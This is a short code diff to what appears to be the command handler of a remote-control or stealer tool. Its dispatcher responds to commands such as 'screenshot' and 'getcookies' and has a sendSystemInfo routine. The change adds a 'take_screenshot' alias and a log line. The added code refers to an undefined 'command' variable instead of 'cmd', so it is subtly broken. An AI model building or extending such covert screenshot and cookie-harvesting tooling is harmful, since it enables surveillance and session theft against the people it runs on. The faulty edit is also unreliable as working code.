@@ -128,9 +128,11 @@ async function sendSystemInfo() {
 // === Handle Commands ===
 async function handleCommand(cmd) {
   switch (cmd.type?.toLowerCase()) {
-    case 'screenshot':
-      await captureScreenshot(cmd.payload?.quality || 50);
-      break;
+case 'take_screenshot':
+case 'screenshot':
+  console.log('[Handling Command] screenshot => captureScreenshot');
+  await captureScreenshot(command.payload?.quality || 50);
+  break;
     case 'getcookies':
       await getCookiesForDomain(cmd.payload?.domain || null);
       break;
@@ -255,3 +257,4 @@ if (typeof window !== 'undefined') {
     }
   };
 }
+
